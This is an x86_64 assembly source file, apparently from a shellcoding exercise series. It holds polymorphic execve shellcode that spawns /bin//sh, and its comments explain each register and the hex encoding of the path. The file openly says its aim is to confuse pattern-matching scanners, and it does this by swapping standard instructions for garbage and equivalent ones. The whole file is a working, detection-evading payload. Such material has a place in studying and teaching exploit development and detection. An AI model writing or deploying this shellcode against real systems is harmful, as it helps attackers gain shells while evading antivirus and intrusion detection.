; David @InfinitelyManic
; 042-polymorphic_shellcode
; intent is to confuse pattern matching scanners
; see polymorphic engines

section .bss
section .data
section .text
        global _start
_start:
        ;  <syscall name="execve" number="59"/>
        ;  int execve(const char *filename, char *const argv[], char *const envp[]);
        ;  x86_64                 rdi                   rsi                 rdx       r10 r8 r9

        ;xor rax, rax                           ; null
        mov rbx, rax
        add rcx, 10
        sub rax, rbx                            ; garbage

        ;push rax                               ; push 0x00
        mov qword [rsp - 8], rax
        xor rcx, rcx
        sub rsp, 8

        ; we need /bin//sh in hex in reverse
        ; rev <<< "/bin//sh" | xxd -g4
        ; 00000000: 68732f2f 6e69622f 0a                 hs//nib/.

        mov rbx, 0x68732f2f6e69622f     ; hs//nib/ ascii

        push rbx                        ; push '/bin//sh' to stack

        mov rdi, rsp                    ; _filename = '/bin//sh'0000

        push rax                        ; second null 0x00 ""

        mov rdx, rsp                    ; envp = array of strings == null

        push rdi                        ; push _filename

        mov rsi, rsp                    ; argv = array of argument strings  = _filename

        add rax, 59                     ; syscall # for execve
        syscall
_exit:
        mov rax, 60
        xor rdi, rdi
        syscall

